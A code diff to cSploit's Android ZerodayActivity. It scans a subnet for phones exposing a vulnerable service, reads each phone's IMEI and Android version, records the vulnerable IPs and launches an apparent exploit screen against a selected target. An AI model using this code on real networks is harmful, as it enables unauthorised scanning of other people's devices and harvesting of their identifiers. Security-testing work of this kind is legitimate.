@@ -1,17 +1,24 @@
 package org.csploit.android;
 
 import android.app.Activity;
+import android.content.ComponentName;
 import android.content.Context;
+import android.content.Intent;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.support.v7.app.ActionBarActivity;
+import android.text.Html;
 import android.util.Log;
+import android.view.LayoutInflater;
 import android.view.View;
+import android.view.ViewGroup;
+import android.widget.AdapterView;
 import android.widget.ArrayAdapter;
 import android.widget.Button;
 import android.widget.EditText;
+import android.widget.ImageView;
 import android.widget.ListView;
 import android.widget.ProgressBar;
 import android.widget.TextView;
@@ -19,6 +26,7 @@ import android.widget.Toast;
 import android.widget.ToggleButton;
 
 import org.apache.commons.net.util.SubnetUtils;
+import org.csploit.android.net.Target;
 
 import java.io.IOException;
 import java.io.InputStream;
@@ -31,6 +39,8 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+
+import static android.widget.AdapterView.*;
 
 /**
  * Created by heeeeen on 15/5/7. @h33n
@@ -100,7 +110,7 @@ public class ZerodayActivity extends ActionBarActivity{
             if (m.find()) {
                 String reverseIMEI = m.group(2);
                 StringBuilder sb = new StringBuilder(reverseIMEI);
-                return "IMEI "+sb.reverse().toString();
+                return sb.reverse().toString();
             }else
                 return null;
         }
@@ -113,12 +123,13 @@ public class ZerodayActivity extends ActionBarActivity{
             xxx && xxx({"error":0,"package_infos":[{"version_name":"4.4.2-206","package_name":"android","package_state":1,"version_code":19}]});
             4.4.2 is Android version.  @h33n
         */
-            String p = "(.*)((\\d)\\.(\\d)\\.(\\d))(.*)";
+          // String p = "(.*)((\\d)\\.(\\d)\\.(\\d))(.*)";
+            String p = "version_name\":\"(.*)\",\"package_name";
             Pattern regex = Pattern.compile(p);
             Matcher m = regex.matcher(result);
             if (m.find()) {
-                String androidVersion = m.group(2);
-                return "Android "+androidVersion;
+                String androidVersion = m.group(1);
+                return androidVersion;
             }else
                 return null;
         }
@@ -134,13 +145,14 @@ public class ZerodayActivity extends ActionBarActivity{
                 String urlGetIMEI = HTTP_PREFIX + s + REQUEST_GET_IMEI;
                 String urlGetAndroid = HTTP_PREFIX + s + REQUEST_GET_ANDROID_INFO;
                 try {
+
                     imei = getIMEI(scanUrl(urlGetIMEI));
                     android_info = getAndroidInfo(scanUrl(urlGetAndroid));
                 } catch (IOException e) {
                     continue;
                 }
                 Log.d("heen", s + " is vulneralbe!");
-                resultList.add(s+":"+imei+":"+android_info+" is vulnerable!");
+                resultList.add(s+":"+imei+":"+android_info);
             }
 
             return resultList;
@@ -153,6 +165,7 @@ public class ZerodayActivity extends ActionBarActivity{
             for (String s:result) {
                 Log.d("heen", "vul phone" + s);
                 mListAdapter.add(s);
+                m_vulPhoneList.add(s.split(":")[0]);  // get the ip of vulnerable phone @h33n
             }
             Toast.makeText(ZerodayActivity.this,"扫描完毕！",Toast.LENGTH_LONG).show();
             setStoppedState();
@@ -231,5 +244,15 @@ public class ZerodayActivity extends ActionBarActivity{
 
 		mListAdapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1);
 		mResultList.setAdapter(mListAdapter);
-    }
+        mResultList.setOnItemClickListener(new OnItemClickListener() {
+            @Override
+            public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
+               Log.d("heen", "phone "+m_vulPhoneList.get(position)+" clicked!");
+               Intent i = new Intent();
+               i.setComponent(new ComponentName(ZerodayActivity.this, BDExpActivity.class));
+               i.putExtra("targetIP", m_vulPhoneList.get(position));
+               startActivity(i);
+            }
+        });
+   }
 }
